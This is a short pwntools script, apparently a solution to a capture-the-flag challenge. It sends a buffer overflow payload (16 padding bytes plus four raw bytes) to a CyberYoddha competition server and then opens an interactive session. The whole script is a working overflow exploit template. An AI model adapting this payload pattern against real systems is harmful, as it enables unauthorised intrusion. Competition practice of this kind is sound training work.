from pwn import *
offset = 0x10
payload = 'A'*offset
payload += '?\xb3\xad\xd3'

host = "cyberyoddha.baycyber.net"
port = 10003

p = connect(host,port)
p.sendline(payload)
p.interactive()
